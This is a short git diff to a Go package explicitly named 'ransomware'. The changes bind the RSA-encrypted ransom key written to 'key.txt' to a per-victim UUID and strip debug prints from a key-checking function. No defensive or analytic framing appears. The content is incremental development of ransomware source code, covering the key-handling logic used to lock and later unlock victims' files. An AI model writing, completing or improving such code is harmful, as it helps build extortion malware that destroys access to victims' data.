@@ -3,7 +3,6 @@ package ransomware
 import (
 	"bytes"
 	"errors"
-	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
@@ -82,7 +81,7 @@ func checkIfEncrypted(path string) bool {
 // WriteKeyFile takes in the ransomware's key and writes the rsa public key encrypted
 // version of the key into a file called 'key.txt'
 func (rw *Ransomware) WriteKeyFile() error {
-	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key)
+	rsaEncryptedKey, err := crypt.EncryptKey(rw.Key, rw.Data.UUID)
 	if err != nil {
 		return err
 	}
@@ -109,9 +108,6 @@ func (rw *Ransomware) CheckIfValidKey() bool {
 	if err != nil {
 		return false
 	}
-
-	fmt.Println("corrent key length: ", len(rw.Key))
-	fmt.Println("key file length: ", len(rw.Key))
 
 	if bytes.Equal(key, rw.Key) {
 		return true
